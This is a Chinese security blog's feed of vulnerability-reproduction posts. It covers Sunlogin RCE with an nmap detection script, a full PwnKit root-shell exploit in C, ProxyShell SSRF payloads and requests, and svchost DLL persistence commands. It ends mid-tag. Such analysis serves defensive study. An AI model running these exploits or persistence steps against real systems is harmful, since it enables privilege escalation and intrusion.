<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>九世的博客</title>
  
  
  <link href="http://422926799.github.io/atom.xml" rel="self"/>
  
  <link href="http://422926799.github.io/"/>
  <updated>2022-02-17T15:59:21.328Z</updated>
  <id>http://422926799.github.io/</id>
  
  <author>
    <name>九世</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>向日葵RCE漏洞复现分析</title>
    <link href="http://422926799.github.io/posts/c5ac22a4.html"/>
    <id>http://422926799.github.io/posts/c5ac22a4.html</id>
    <published>2022-02-17T15:45:27.000Z</published>
    <updated>2022-02-17T15:59:21.328Z</updated>
    
    <content type="html"><![CDATA[<p>复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》</p><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>漏洞范围：小于或等于11.x<br>复现的版本：11.0.0.33162<br><img src="https://s4.ax1x.com/2022/02/17/HIjjRU.png" alt=""></p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>这里跟踪了check接口、路由接口、认证接口这三个<br>首先脱壳，向日葵加了UPX，upx -d脱掉即可<br><img src="https://s4.ax1x.com/2022/02/17/HIvCZR.png" alt=""></p><p>向日葵对应的端口，找到SunloginService服务的PID在找端口即可<br><img src="https://s4.ax1x.com/2022/02/17/HIviIx.png" alt=""></p><p>向日葵在启动的时候会开启该服务，端口绑定在服务里（没更）。向日葵的端口大概是<strong>4w-5w</strong><br><img src="https://s4.ax1x.com/2022/02/17/HIvERO.png" alt=""></p><p>根据PDF里的先获取CID才能后续利用，open IDA shift+F12搜索CID<br><img src="https://s4.ax1x.com/2022/02/17/HIveQe.png" alt=""></p><p>（先连接一次向日葵然后在log里可以看到CID，对应log位置：SunloginClient\log\sunlogin_service.&lt;日期&gt;.log）<br><img src="https://s4.ax1x.com/2022/02/17/HIv1FP.png" alt=""></p><p>根据PDF里的访问/cgi-bin/rpc可以未授权获取到CID。找到路由可以看到对应的处理函数(sub_140E216BA-&gt;找到该函数的方法上面提到的搜索CID字符串跟入其中一个函数在上级便是路由)<br>（懒得截图了，处理函数是sub_140E1C954）<br><img src="https://s4.ax1x.com/2022/02/17/HIvJSS.png" alt=""></p><p>当满足action=verify-haras会返回verify_string而和CID对比两者一致<br><img src="https://s4.ax1x.com/2022/02/17/HIvaes.png" alt=""><br><img src="https://s4.ax1x.com/2022/02/17/HIvBF0.png" alt=""></p><p>当为action为fast-login，是识别码和本地验证码的处理，认证成功后也可以获取CID<br><img src="https://s4.ax1x.com/2022/02/17/HIvrWT.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIvcy4.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIv5Y6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIx64P.png" alt=""></p><p>参数需要:action=fast-login&amp;fastcode=&lt;本地识别码&gt;&amp;verify_string=&lt;本地验证码&gt;&amp;use_custom_password=1<br><img src="https://s4.ax1x.com/2022/02/17/HIxRgS.png" alt=""></p><p>也可以通过login.cgi验证获取CID<br><img src="https://s4.ax1x.com/2022/02/17/HIzpU1.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzPC6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzi8K.png" alt=""></p><p><strong>check接口RCE</strong><br>获取cmd值后，判断是否存在ping命令然后跳到LABEL_27，调用sub_140E20B64执行命令<br><img src="https://s4.ax1x.com/2022/02/17/HIzVDH.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIztVs.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzdP0.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzBxU.png" alt=""></p><p><strong>认证接口</strong><br>回到路由，跟踪上一级（或者搜索:{“success”:false,”msg”:”Verification failure”}定位）<br><img src="https://s4.ax1x.com/2022/02/17/HIzgaR.png" alt=""></p><p>可以看到判断cookie是否存在和CID的赋值，最后传入v132判断CID是否正确<br><img src="https://s4.ax1x.com/2022/02/17/HIzWPx.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/02/17/HIzHZd.png" alt=""></p><p>如果是请求路径是下面其中一个则会进入到sub_14061D284（也就是刚刚的路由）<br><img src="https://s4.ax1x.com/2022/02/17/HIzXJP.png" alt=""></p><p>nmap检测脚本：</p><pre><code class="lua">local http=require &quot;http&quot;local shortport=require &quot;shortport&quot;local stdnse=require &quot;stdnse&quot;local string=require &quot;string&quot;local vulns=require &quot;vulns&quot;local json=require &quot;json&quot;portrule=function(host,port)        if (port.state==&quot;open&quot;) and (port.protocol==&quot;tcp&quot;) then                return true        endendaction=function(host,port)        local status=stdnse.output_table()        local url=string.format(&quot;http://%s:%s&quot;,host.ip,port.number)        local banner=&quot;{\&quot;success\&quot;:false,\&quot;msg\&quot;:\&quot;Verification failure\&quot;}&quot;        local headers={header={}}        headers[&quot;header&quot;][&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0&quot;        local rqt=http.get_url(url,headers)        if (rqt.status==200) and (string.match(rqt.body,banner)) then                status.banner=&quot;SunloginClient&quot;                local uri=&quot;/cgi-bin/rpc&quot;                local postdata=&quot;action=verify-haras&quot;                local cid_check=http.post(host,port,uri,nil,true,postdata)                if(cid_check.status==200) then                        local json_check,json_data=json.parse(cid_check.body)                        if (json_data[&quot;enabled&quot;]==&quot;1&quot;) then                                status.rce=&quot;YES&quot;                                status.cid=json_data[&quot;verify_string&quot;]                        end                end                if (status~=nil) then                        return status                end        endend</code></pre><p><img src="https://s4.ax1x.com/2022/02/17/HoSpLQ.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;复现基本参考：space老哥的《向日葵远程命令执行漏洞分析》&lt;/p&gt;
&lt;h2 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h2&gt;&lt;p&gt;漏洞范围：小于或等于11.x&lt;br&gt;复现的版本：</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>pkexec提权漏洞复现</title>
    <link href="http://422926799.github.io/posts/2b1cd54.html"/>
    <id>http://422926799.github.io/posts/2b1cd54.html</id>
    <published>2022-01-28T09:04:55.000Z</published>
    <updated>2022-01-28T09:21:00.858Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现的一个内存损坏漏洞，允许非特权用户获取root权限。根据作者的发布文章说，在默认安装的Ubuntu、Debian、Fedora和CentOS上都已经成功复现。这个漏洞已经隐藏了12年多，并影响自2009年5月第一个版本以来的所有pkexec版本：（commit c8c3d83，“Add a pkexec(1) command”）<br><img src="https://s4.ax1x.com/2022/01/28/7x4Dte.png" alt=""></p><h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>1.存在pkexec命令<br>2.pkexec在suid里<br><img src="https://s4.ax1x.com/2022/01/28/7x5q8H.png" alt=""></p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>全”环境变量（例如 LD_PRELOAD）放在 pkexec 的 环境; 如果是正常设置环境变量，这些“不安全”变量通常会被删除（通过 ld.so），如GCONV_PATH就是不安全的环境变量，因为他会导致任意so执行。同时pkexec是一个默认具有suid<br>属性的程序，如果能让其执⾏命令，那么就能导致suid提权了。所以利⽤中允许我们绕过过滤写⼊GCONV_PATH，然后设置gconv-modules文件，触发字符集转换，调用iconv_open加载对应字符集的so文件。</p><p>534行：for循环argc=0，所以不会进入循环，但n已经设置成1<br>610行：argv[1]赋值给path<br><img src="https://s4.ax1x.com/2022/01/28/7xIBzd.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIrQA.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/28/7xIfJg.png" alt=""></p><p>因为argv和envp指针在内存中是连续的，如果argc为0，那么越界argv[1]实际上是envp[0]<br><img src="https://s4.ax1x.com/2022/01/28/7xIbwV.png" alt=""></p><p>如果按照上面的代码逻辑，如果传⼊的命令不是绝对路径，就会在 PATH 环境变量的目录搜索，在赋<br>值回argv</p><p>假设我们执行pkexec，此时argc=0，envp={“xxx”}<br>610行，程序会读取argv[1]到path变量中，也就是”xxx”<br>632行，s = g_find_program_in_path (path)找到该程序的绝对路径，假设为/usr/bin/xxx<br>639行，程序将s写入argv[1]和path，从而覆盖了第一个环境变量。此时envp也就变成了{“/usr/bin/xxx”}<br><img src="https://s4.ax1x.com/2022/01/28/7xoAYD.png" alt=""></p><p>根据找到的函数进行寻找利用：<br>在pkexec中多次使用了g_printerr()函数，该函数是调用GLib的函数。但是如果环境变量CHARSET不是UTF-8，g_printerr()将会调用glibc的函数iconv_open()，来将消息从UTF-8转换为另一种格式。<br>iconv_open函数的执行过程为：iconv_open函数首先会找到系统提供的gconv-modules配置文件，这个文件中包含了各个字符集的相关信息存储的路径，每个字符集的相关信息存储在一个.so文件中，即gconv-modules文件提供了各个字符集的.so文件所在位置，之后会调用.so文件中的gconv()与gonv_init()函数。<br>如果我们改变了系统的GCONV_PATH环境变量，也就能改变gconv-modules配置文件的位置，从而执行一个恶意的so文件实现任意命令执行。</p><p><strong>argv[n] = path=s就能重新触发环境变量加载，因为g_printerr()将会调用glibc的函数iconv_open()利用环境变量重新定义了GCONV_PATH，最后找到自己定义的so。加载了gconv_init函数，最后由于又是SUID权限实现了提权其实就是类似于DLL劫持</strong></p><p>CVE-2021-4034</p><pre><code class="c">/** Proof of Concept for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) by Andris Raugulis &lt;moo@arthepsy.eu&gt;* Advisory: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034*/#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;char *shell =    &quot;#include &lt;stdio.h&gt;\n&quot;    &quot;#include &lt;stdlib.h&gt;\n&quot;    &quot;#include &lt;unistd.h&gt;\n\n&quot;    &quot;void gconv() {}\n&quot;    &quot;void gconv_init() {\n&quot;    &quot;    setuid(0); setgid(0);\n&quot;    &quot;    seteuid(0); setegid(0);\n&quot;    &quot;    system(\&quot;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf &#39;GCONV_PATH=.&#39; &#39;pwnkit&#39;; /bin/sh\&quot;);\n&quot;    &quot;    exit(0);\n&quot;    &quot;}&quot;;int main(int argc, char *argv[]) {    FILE *fp;    system(&quot;mkdir -p &#39;GCONV_PATH=.&#39;; touch &#39;GCONV_PATH=./pwnkit&#39;; chmod a+x &#39;GCONV_PATH=./pwnkit&#39;&quot;);    system(&quot;mkdir -p pwnkit; echo &#39;module UTF-8// PWNKIT// pwnkit 2&#39; &gt; pwnkit/gconv-modules&quot;);    fp = fopen(&quot;pwnkit/pwnkit.c&quot;, &quot;w&quot;);    fprintf(fp, &quot;%s&quot;, shell);    fclose(fp);    system(&quot;gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC&quot;);    char *env[] = { &quot;pwnkit&quot;, &quot;PATH=GCONV_PATH=.&quot;, &quot;CHARSET=PWNKIT&quot;, &quot;SHELL=pwnkit&quot;, NULL };    execve(&quot;/usr/bin/pkexec&quot;, (char*[]){NULL}, env);}</code></pre><p><img src="https://s4.ax1x.com/2022/01/28/7xo3tS.png" alt=""></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><ul><li>新版pkexec已修复了漏洞 (更新pkexec)<br><img src="https://s4.ax1x.com/2022/01/28/7xot6s.png" alt=""></li><li>取消pkexec SUID权限</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://saucer-man.com/information_security/876.html" target="_blank" rel="noopener">https://saucer-man.com/information_security/876.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;2022-01-25，CVE-2021-4034利用详情发布，该漏洞是Qualys研究团队在polkit的pkexec中发现</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>Exchange ProxyShell漏洞复现</title>
    <link href="http://422926799.github.io/posts/e4d494fa.html"/>
    <id>http://422926799.github.io/posts/e4d494fa.html</id>
    <published>2022-01-21T15:59:02.000Z</published>
    <updated>2022-01-21T17:38:30.822Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这周复现了proxyshell这个漏洞，一直嫌麻烦没弄。跟dll跟了两天终于弄明白了</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>影响的漏洞版本：Exchange&gt;9 &lt;=23</p><pre><code>Microsoft Exchange Server 2019 Cumulative Update 9Microsoft Exchange Server 2019 Cumulative Update 8Microsoft Exchange Server 2016 Cumulative Update 20Microsoft Exchange Server 2016 Cumulative Update 19Microsoft Exchange Server 2013 Cumulative Update 23</code></pre><p>漏洞介绍:</p><pre><code>* CVE-2021-34473 - 一个ssrf漏洞* CVE-2021-34523 - Exchange PowerShell BackEnd提权* CVE-2021-31207 - 认证后任意文件写入漏洞</code></pre><p>利用的本质就是在前台服务中存在校验缺失，导致外面发起的请求可以以前台服务的进程作为跳板进行后台服务资源的访问。<br><img src="https://s4.ax1x.com/2022/01/22/7WBmb6.png" alt=""></p><p>前台服务<br><img src="https://s4.ax1x.com/2022/01/22/7WBHqx.png" alt=""></p><p>后台服务<br><img src="https://s4.ax1x.com/2022/01/22/7WDFdf.png" alt=""></p><p>444端口是system权限<br><img src="https://s4.ax1x.com/2022/01/22/7WDnQs.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WDuyn.png" alt=""></p><h2 id="漏洞原理分析与复现"><a href="#漏洞原理分析与复现" class="headerlink" title="漏洞原理分析与复现"></a>漏洞原理分析与复现</h2><p>这次涉及到的DLL</p><pre><code>* Microsoft.Exchange.FrontEndHttpProxy.dll* Microsoft.Exchange.HttpProxy.Common.dll* Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll</code></pre><p><strong>CVE-2021-34473</strong><br>Exchange主要路由是在Microsoft.Exchange.FrontEndHttpProxy.dll里的SelectHandlerForUnauthenticateRequest函数里,该函数对处理不同请求路径的服务进行处理。<br><img src="https://s4.ax1x.com/2022/01/22/7WDUyR.png" alt=""></p><p>AutodiscoverProxyRequestHandler函数实现：</p><pre><code>=&gt; 实现 EwsAutodiscoverProxyRequestHandler  =&gt; 实现 BEServerCookieProxyRequestHandler   =&gt; 实现 ProxyRequestHandler</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7WDaO1.png" alt=""></p><p>ProxyRequestHandler调用了GetTargetBackEndServerUrl函数<br><img src="https://s4.ax1x.com/2022/01/22/7WDsYD.png" alt=""></p><p>跟下去发现调用了同类里的GetClientUrlForProxy函数 (this.GetClientUrlForProxy=&gt;Microsoft.Exchange.HttpProxy.EwsAutodiscoverProxyRequestHandler.GetClientUrlForProxy())<br><img src="https://s4.ax1x.com/2022/01/22/7WDgld.png" alt=""></p><p>GetClientUrlForProxy函数调用了IsAutodiscoverV2Request检查url<br><img src="https://s4.ax1x.com/2022/01/22/7WDROI.png" alt=""></p><p>IsAutodiscoverV2Request函数，判断url路径是否存在<br><img src="https://s4.ax1x.com/2022/01/22/7WDXmq.png" alt=""></p><p>回到GetTargetBackEndServerUrl，调用RemoveExplicitLogonFromUrlAbsoluteUri函数。传入了个this.explicitLogonAddress参数。跟踪这个参数被谁赋值了。调用了 ResolveAnchorMailbox函数，请求Email参数的值赋予（无论是：GET、POST、COOKIE都可以）<br><img src="https://s4.ax1x.com/2022/01/22/7Wric9.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WrK9e.png" alt=""></p><p>回到ResolveAnchorMailbox函数，如果请求路径中存在于Email参数中，则进行url截取<br><img src="https://s4.ax1x.com/2022/01/22/7WrljA.png" alt=""></p><p>没截取前<br><img src="https://s4.ax1x.com/2022/01/22/7WrGHP.png" alt=""></p><p>截取后<br><img src="https://s4.ax1x.com/2022/01/22/7Wra9g.png" alt=""></p><p>回到ProxyRequestHandler函数继续往下跟踪，设置port为444端口<br><img src="https://s4.ax1x.com/2022/01/22/7Wr0js.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WrrBq.png" alt=""></p><p>继续动态跟踪下去时，发现到了BeginProxyRequest函数里，去到CreateServerRequest函数。跟入后发现WebRequest初始化传入url。在往下面后就是发送请求然后获取响应<br><img src="https://s4.ax1x.com/2022/01/22/7WrsH0.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Wrg4U.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Wrhv9.png" alt=""></p><p>最后结出上面的规则为：</p><pre><code>* url路径必须带有/autodiscover/autodiscover.json或者/autodiscover/autodiscover.json/V1.0* Email参数 带有url路径会被进行截断（Email参数在GET、POST、COOKIE请求都可以）* 最后修改port为444，进行请求获取响应</code></pre><p>payload</p><pre><code>https://100.100.5.217/autodiscover/autodiscover.json?@foo.com/mapi/nspi/?&amp;Email=autodiscover/autodiscover.json%3f@foo.com</code></pre><p>出现以下页面则代表存在SSRF漏洞 (SYSTEM权限令牌绕过登录)<br><img src="https://s4.ax1x.com/2022/01/22/7WrXgH.png" alt=""></p><p>直接访问/mapi/nspi/是需要登录的<br><img src="https://s4.ax1x.com/2022/01/22/7Wrjvd.png" alt=""></p><p>利用exchange的autodiscover服务来查找高权限用户的配置文件，我们需要配置文件中的legacyDn属性，这个属性可以帮助我们得到目标用户的sid，如果能得到目标用户sid，我们就可以拥有目标用户的权限来使用ews的api进行恶意炒作例如监听其他用户的邮件。</p><pre><code>POST /autodiscover/autodiscover.json?@foo.com/autodiscover/autodiscover.xml?=&amp;Email=autodiscover/autodiscover.json%3f@foo.com HTTP/1.1Host: 100.100.5.217Connection: closeCache-Control: max-age=0sec-ch-ua: &quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;96&quot;, &quot;Google Chrome&quot;;v=&quot;96&quot;sec-ch-ua-mobile: ?0sec-ch-ua-platform: &quot;Windows&quot;DNT: 1Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Sec-Fetch-Site: noneSec-Fetch-Mode: navigateSec-Fetch-User: ?1Sec-Fetch-Dest: documentAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PrivateComputer=true; PBack=0; ClientId=2A9DC075E72B49ED95FAF9498FFD63AE; UC=d7662cac28fe41f5a4c752c0cb96f36f; X-OWA-JS-PSD=1; ASP.NET_SessionId=097f8699-5d46-4849-914f-08bcefbf727c; TimeOffset=-480; Eac_CmdletLogging=false; OutlookSession=d4443a26257741528c97c97f1b718e88; mkt=zh-CN; X-OWA-CANARY=XsK-HxTO_E-jYGE_d3TOoxAwaR2929kIrct9DGPb_7Yh46fL8Zwh9sYZrYS7XO0EM_7_veA6Vtw.Content-Type: text/xmlContent-Length: 370&lt;Autodiscover xmlns=&quot;http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006&quot;&gt;        &lt;Request&gt;          &lt;EMailAddress&gt;administrator@yayi.local&lt;/EMailAddress&gt;          &lt;AcceptableResponseSchema&gt;http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a&lt;/AcceptableResponseSchema&gt;        &lt;/Request&gt;    &lt;/Autodiscover&gt;</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7Ws9VP.png" alt=""></p><p>用legacyDn属性值请求获取对应用户的SID (利用接口报错获得的SID，需要在legacyDn后面加不可见字符串，具体建议看脚本抓包)</p><pre><code>POST //autodiscover/autodiscover.json?a=mpoak@ldxzf.rgq/mapi/emsmdb HTTP/1.1Host: 192.168.1.106Accept-Encoding: gzip, deflateCookie: Email=autodiscover/autodiscover.json?a=mpoak@ldxzf.rgqX-Requesttype: ConnectX-Clientinfo: {2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}X-Clientapplication: Outlook/15.0.4815.1002X-Requestid: {C715155F-2BE8-44E0-BD34-2960067874C8}:2Content-Type: application/mapi-httpContent-Length: 141Connection: close/o=yayimail/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=36252da5ce5d4b7cbee9eda07b45ab16-pentest</code></pre><p><img src="https://s4.ax1x.com/2022/01/22/7WsZKs.png" alt=""></p><p>根据CVE-2018-8581我们可以知道，如果我们知道某个用户的sid，那么我们就可以模拟这个用户使用SOAP通过ews的api进行各种操作，例如监听其他用户的邮件。但这是远远不够的。我们可以尝试访问Exchange PowerShell Remoting进行RCE攻击。</p><p><strong>CVE-2021-34523分析</strong><br>Exchange PowerShell Remoting是一个基于WSMan协议的一个服务，他可以执行一些特定的powershell命令，实现的功能有发邮件、读邮件、更新配置文件等，使用的前提是使用者需具有邮箱，可是如果我们利用前面的ssrf漏洞来使用system用户的身份使用此服务的话就会失败，原因是system用户是没有邮箱的。因此我们需要解决一个认证问题，使得我们可以以高权限用户的身份去使用这个服务，进而进行后续操作。</p><p>这时候我们有几个难点：</p><pre><code>* 无法通过设置X-CommonAccessToken间接设置CommonAccessToken来伪造自己的身份，因为有黑名单的存在，因此exchange无法通过ssrf将X-CommonAccessToken的值带给backend，因此无法通过这种方法进行身份验证。（没研究为什么）* 想要通过认证必须传递正确的CommonAccessToken给Backend。* 即使我们找到了一个可传递的点，但我们到底传递什么样的CommonAccessToken才能使得exchange 的backend认为我们是高权限用户呢？</code></pre><p>在Microsoft.Exchange.Configuration.RemotePowershellBackendCmdletProxyModule.dll，有个RemotePowershellBackendCmdletProxyModule函数。有一个用户可控的输入点，这个输入点输入的数据最终会变成CommonAccessToken的值<br><img src="https://s4.ax1x.com/2022/01/22/7WsJM9.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7Ws0PO.png" alt=""></p><p>CommonAccessToken.Deserialize函数是解密从X-Rps-CAT参数传入的值<br><img src="https://s4.ax1x.com/2022/01/22/7WscqI.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WsTMj.png" alt=""><br><img src="https://s4.ax1x.com/2022/01/22/7WsHLn.png" alt=""></p><p>网上的文章都有在这里断点然后查看内存（我这没跟）<br><img src="https://i.bmp.ovh/imgs/2022/01/4488c69909dba75c.png" alt=""></p><p>加密必须有的:</p><pre><code>1. 用户名2. 用户sid，推荐Administrator，即使域环境禁用了管理员用户administrator，仍然能够认证成功3. group sid，可随便指定一个例如S-1-1-04. 最终将得到的值进行base64加密后即可作为payload使用</code></pre><p><strong>CVE-2021-31207</strong><br>在实现认证后，利用New-MailboxExportRequest导出邮件getshell。在导出之前需要利用SSRF调用接口去发送邮件<br>（这里有个问题，邮件内容都是用PKT加密的，导出的webshell也是PKT加密的。需要自己加解密）<br>参考微软:<a href="https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/openspecs/office_file_formats/ms-pst/5faf4800-645d-49d1-9457-2ac40eb467bd)%E3%80%82</a><br><img src="https://i.bmp.ovh/imgs/2022/01/c560a6b9aff01afa.png" alt=""></p><p><strong>复现过程</strong><br>利用过程</p><pre><code>1. SSRF获取legacyDn2. SSRF获取用户SID3. SSRF往指定用户发邮件4. 构造CommonAccessToken访问powershell接口，利用New-MailboxExportRequest导出webshell</code></pre><p>这里有个问题是，如何构造xml向目标powershell接口发送。pypsrp可以实现利用winrm调用powershell，发送的数据也是xml的。但是如何通过将xml数据发送？<br><img src="https://i.bmp.ovh/imgs/2022/01/0fb9c8f9a09cda06.png" alt=""></p><p>利用脚本的思路是开个httpserver重写class解决<br><img src="https://i.bmp.ovh/imgs/2022/01/18063e240f8c8237.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/8f88ab63c62a325f.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/1ddf5b731b3a169b.png" alt=""></p><p><img src="https://i.bmp.ovh/imgs/2022/01/bb1c6c13d1e5ce2b.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/" target="_blank" rel="noopener">https://y4y.space/2021/08/12/my-steps-of-reproducing-proxyshell/</a><br><a href="https://www.anquanke.com/post/id/251713#h2-4" target="_blank" rel="noopener">https://www.anquanke.com/post/id/251713#h2-4</a><br><a href="https://blog.csdn.net/qq_41874930/article/details/120037619" target="_blank" rel="noopener">https://blog.csdn.net/qq_41874930/article/details/120037619</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这周复现了proxyshell这个漏洞，一直嫌麻烦没弄。跟dll跟了两天终于弄明白了&lt;/p&gt;
&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;</summary>
      
    
    
    
    
    <category term="漏洞复现" scheme="http://422926799.github.io/tags/漏洞复现/"/>
    
  </entry>
  
  <entry>
    <title>svchost.exe挂载DLL</title>
    <link href="http://422926799.github.io/posts/3047149d.html"/>
    <id>http://422926799.github.io/posts/3047149d.html</id>
    <published>2022-01-15T17:28:39.000Z</published>
    <updated>2022-01-15T17:36:01.766Z</updated>
    
    <content type="html"><![CDATA[<h2 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h2><p><img src="https://s4.ax1x.com/2022/01/16/7YH6o9.png" alt=""></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>vs新建类库编译个处理服务循环响用的DLL</p><pre><code>#include &quot;pch.h&quot;#define SVCNAME TEXT(&quot;EvilSvc&quot;)SERVICE_STATUS serviceStatus;SERVICE_STATUS_HANDLE serviceStatusHandle;HANDLE stopEvent = NULL;VOID UpdateServiceStatus(DWORD currentState){    serviceStatus.dwCurrentState = currentState;    SetServiceStatus(serviceStatusHandle, &amp;serviceStatus);}DWORD ServiceHandler(DWORD controlCode, DWORD eventType, LPVOID eventData, LPVOID context){    switch (controlCode)    {        case SERVICE_CONTROL_STOP:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_SHUTDOWN:            serviceStatus.dwCurrentState = SERVICE_STOPPED;            SetEvent(stopEvent);            break;        case SERVICE_CONTROL_PAUSE:            serviceStatus.dwCurrentState = SERVICE_PAUSED;            break;        case SERVICE_CONTROL_CONTINUE:            serviceStatus.dwCurrentState = SERVICE_RUNNING;            break;        case SERVICE_CONTROL_INTERROGATE:            break;        default:            break;    }    UpdateServiceStatus(SERVICE_RUNNING);    return NO_ERROR;}VOID ExecuteServiceCode(){    stopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);    UpdateServiceStatus(SERVICE_RUNNING);    // #####################################    // your persistence code here    // #####################################    while (1)    {        WaitForSingleObject(stopEvent, INFINITE);        UpdateServiceStatus(SERVICE_STOPPED);        return;    }}extern &quot;C&quot; __declspec(dllexport) VOID WINAPI ServiceMain(DWORD argC, LPWSTR * argV){    serviceStatusHandle = RegisterServiceCtrlHandler(SVCNAME, (LPHANDLER_FUNCTION)ServiceHandler);    serviceStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;    serviceStatus.dwServiceSpecificExitCode = 0;    UpdateServiceStatus(SERVICE_START_PENDING);    ExecuteServiceCode();}</code></pre><p>创建EvilSvc服务</p><pre><code>sc.exe create EvilSvc binPath= &quot;c:\windows\System32\svchost.exe -k DcomLaunch&quot; type= share start= auto</code></pre><p>修改EvilSvc DLL路径为自己的DLL路径</p><pre><code>reg add HKLM\SYSTEM\CurrentControlSet\services\EvilSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\Windows\system32\EvilSvc.dll /f</code></pre><p>注册表查看该服务如下<br><img src="https://s4.ax1x.com/2022/01/16/7YHWz6.png" alt=""></p><p><img src="https://s4.ax1x.com/2022/01/16/7YH4sO.png" alt=""></p><p>修改svchost组里的DcomLaunch<br>（添加创建的服务名）<br><img src="https://s4.ax1x.com/2022/01/16/7YH5LD.png" alt=""></p><p>启动EvilSvc服务</p><pre><code>sc start EvilSvc</code></pre><p><img src="https://s4.ax1x.com/2022/01/16/7YHoee.png" alt=""></p><p><img 